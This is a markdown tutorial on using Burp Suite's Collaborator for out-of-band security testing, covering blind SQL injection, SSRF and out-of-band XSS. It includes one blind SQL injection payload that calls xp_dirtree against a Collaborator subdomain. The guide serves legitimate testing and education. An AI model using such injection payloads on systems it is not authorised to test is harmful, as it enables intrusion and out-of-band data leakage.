# Burp Collaborator

## 🔍 What is Burp Collaborator?

**Burp Collaborator** is an **Out-of-Band Application Security Testing (OAST)** tool. It enables you to identify vulnerabilities like **blind SQL injection**, **server-side request forgery (SSRF)**, and **out-of-band XSS**, where traditional testing methods might fail due to the lack of direct feedback from the application.

---

## ⚙️ How Does It Work?

1. **Generate a Collaborator Payload**: Burp creates a unique subdomain (e.g., `abc123.burpcollaborator.net`) that you can insert into your test requests.
2. **Inject the Payload into the Target Application**: Place the payload in a parameter, header, or any input field that the application processes.
3. **Monitor for Interactions**: Burp Collaborator listens for any DNS, HTTP, or SMTP requests made to the generated subdomain, indicating that the payload was executed.

![image.png](../Burp%20Collaborator/image.png)

---

## 🛠️ Step-by-Step Guide to Using Burp Collaborator

### 1. **Access the Target Application**

- Use Burp's embedded browser to navigate to the application you want to test.

### 2. **Identify an Interesting Request**

- In Burp's **Proxy > HTTP history** tab, locate a request that you suspect might be vulnerable.
- Right-click on the request and select **"Send to Repeater"**.

### 3. **Insert a Collaborator Payload**

- In the **Repeater** tab, identify a suitable location in the request (e.g., a header or parameter).
- Right-click on the selected area and choose **"Insert Collaborator payload"**.
- This action replaces the selected text with a unique Collaborator

### 4. **Send the Modified Request**

- Click **"Send"** in the Repeater tab to dispatch the request to the target application.

### 5. **Poll for Interactions**

- Navigate to the **Collaborator** tab in Burp Suite.
- Burp automatically polls the Collaborator server every 60 seconds.
- To check immediately, click **"Poll now"**.
- If the application interacted with the payload, you'll see entries indicating DNS or HTTP requests to your Collaborator subdomain.

---

## 📊 Analyzing Collaborator Interactions

- **Filtering**: Use the buttons to filter interactions by protocol (HTTP, DNS, SMTP).
- **Searching**: Click on **"Search"** to find specific interactions.
- **Annotating**: Right-click on an interaction to add comments or highlights.
- **Exporting**: Right-click and select **"Export as CSV"** to save interactions for reporting.

---

## 🔐 Using a Private Collaborator Server

For environments with strict security requirements or limited internet access, you can deploy a private instance of the Collaborator server.

### Steps to Deploy:

1. **Set Up a Domain and DNS Records**: Configure a domain (e.g., `collaborator.example.com`) with appropriate DNS records pointing to your server.
2. **Configure the Server**: Set up the Collaborator server to handle DNS, HTTP, and SMTP requests.
3. **Adjust Burp Settings**: In Burp Suite, navigate to **Project > Collaborator** settings and specify your private server's details.

---

## 🧪 Practical Example: Detecting Blind SQL Injection

Imagine a scenario where a web application's input field is vulnerable to SQL injection, but it doesn't return any errors or data. You can:

1. **Generate a Collaborator Payload**: Obtain a unique subdomain from Burp Collaborator.
2. **Craft a Malicious Input**: Insert the payload into the input field, such as:
    
    ```sql
    sql
    '; exec master..xp_dirtree '\\abc123.burpcollaborator.net\share'--
    ```
    
3. **Send the Request**: Submit the input to the application.
4. **Monitor Collaborator**: If the application is vulnerable, the database server will attempt to access the specified subdomain, which Burp Collaborator will detect.

---

## 📘 Additional Resources

- **Burp Collaborator Documentation**: Detailed information on using and configuring Burp Collaborator.
- **Getting Started with Burp Collaborator**: A step-by-step tutorial to help you begin using Collaborator effectively.